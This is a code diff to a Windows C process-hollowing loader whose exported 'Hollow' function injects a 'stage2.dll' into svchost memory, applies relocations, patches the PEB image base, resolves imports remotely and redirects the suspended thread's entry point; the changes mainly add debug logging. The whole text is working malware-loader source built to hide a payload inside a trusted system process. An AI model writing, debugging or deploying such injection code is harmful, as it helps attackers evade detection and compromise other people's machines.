@@ -19,7 +19,7 @@ typedef struct _PROCESS_BASIC_INFORMATION {
 typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);
 
 static void LogMessage(LPCWSTR msg) {
-    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileW(LOG_PATH, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return;
     SetFilePointer(hFile, 0, NULL, FILE_END);
     SYSTEMTIME st;
@@ -188,13 +188,19 @@ static LPVOID FindExportByName(HANDLE hProc, LPVOID dllBase, const char* funcNam
 // Ordinal imports are flagged and rejected (not used in this scenario).
 static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS ntH, LPBYTE localBuf, LPVOID remotePeb) {
     PIMAGE_DATA_DIRECTORY importDir = &ntH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-    if (importDir->Size == 0) return TRUE;
+    if (importDir->Size == 0) { LogMessage(L"[*] no import directory"); return TRUE; }
 
     PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR)(localBuf + importDir->VirtualAddress);
+    int dllCount = 0, funcCount = 0;
     for (; import->Name; import++) {
         const char* dllNameA = (const char*)(localBuf + import->Name);
         wchar_t dllName[256];
         MultiByteToWideChar(CP_ACP, 0, dllNameA, -1, dllName, 256);
+        dllCount++;
+
+        wchar_t dbg[256];
+        wsprintfW(dbg, L"[*] IAT: resolving DLL %d: %s", dllCount, dllName);
+        LogMessage(dbg);
 
         LPVOID remoteDllBase = FindRemoteDllBase(hProc, remotePeb, dllName);
         if (!remoteDllBase) {
@@ -203,6 +209,9 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
             LogMessage(buf);
             return FALSE;
         }
+
+        wsprintfW(dbg, L"[+] IAT: %s found at %p", dllName, remoteDllBase);
+        LogMessage(dbg);
 
         PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(localBuf + import->OriginalFirstThunk);
         LPBYTE remoteIat = (LPBYTE)remoteImage + import->FirstThunk;
@@ -222,8 +231,19 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
                 LogMessage(buf);
                 return FALSE;
             }
-            if (!WriteProcessMemory(hProc, remoteIat, &funcAddr, sizeof(PVOID), NULL)) return FALSE;
+            if (!WriteProcessMemory(hProc, remoteIat, &funcAddr, sizeof(PVOID), NULL)) {
+                wchar_t buf[256];
+                wsprintfW(buf, L"[-] IAT: WriteProcessMemory failed for %s!%s", dllName, ibn->Name);
+                LogMessage(buf);
+                return FALSE;
+            }
+            funcCount++;
         }
+    }
+    {
+        wchar_t dbg[256];
+        wsprintfW(dbg, L"[*] IAT: resolved %d functions across %d DLLs", funcCount, dllCount);
+        LogMessage(dbg);
     }
     return TRUE;
 }
@@ -321,20 +341,34 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     }
     LogMessage(L"[+] stage2.dll written to svchost memory");
 
+    {
+        wchar_t dbg[256];
+        DWORD_PTR _delta = (DWORD_PTR)remoteImage - (DWORD_PTR)targetBase;
+        wsprintfW(dbg, L"[*] delta=0x%Ix, remoteImage=%p, targetBase=%p, imageSize=%lu", _delta, remoteImage, targetBase, imageSize);
+        LogMessage(dbg);
+    }
+
     DWORD_PTR delta = (DWORD_PTR)remoteImage - (DWORD_PTR)targetBase;
     if (delta != 0) {
+        LogMessage(L"[*] calling ApplyRelocations");
         if (!ApplyRelocations(pi.hProcess, remoteImage, ntH, stage2Buf, delta)) {
             LogMessage(L"[-] ApplyRelocations failed");
             LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
             return;
         }
         LogMessage(L"[+] Relocations applied (delta != 0)");
+    } else {
+        LogMessage(L"[*] delta==0, skipping ApplyRelocations");
     }
 
     if (remoteImage != targetBase) {
+        LogMessage(L"[*] updating PEB image base");
         WriteProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + sizeof(PVOID) * 2, &remoteImage, sizeof(PVOID), NULL);
+    } else {
+        LogMessage(L"[*] remoteImage==targetBase, skipping PEB update");
     }
 
+    LogMessage(L"[*] calling ResolveImports");
     if (!ResolveImports(pi.hProcess, remoteImage, ntH, stage2Buf, pbi.PebBaseAddress)) {
         LogMessage(L"[-] IAT resolution failed");
         LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
@@ -342,6 +376,7 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
     }
     LogMessage(L"[+] IAT resolved");
 
+    LogMessage(L"[*] calling GetThreadContext");
     CONTEXT ctx = { CONTEXT_FULL };
     if (!GetThreadContext(pi.hThread, &ctx)) {
         LogMessage(L"[-] GetThreadContext failed");
@@ -349,6 +384,7 @@ __declspec(dllexport) void CALLBACK Hollow(HWND hwnd, HINSTANCE hinst, LPSTR lpC
         return;
     }
     ctx.Rcx = (DWORD64)remoteImage + ntH->OptionalHeader.AddressOfEntryPoint;
+    LogMessage(L"[*] calling SetThreadContext");
     if (!SetThreadContext(pi.hThread, &ctx)) {
         LogMessage(L"[-] SetThreadContext failed");
         LocalFree(stage2Buf); TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
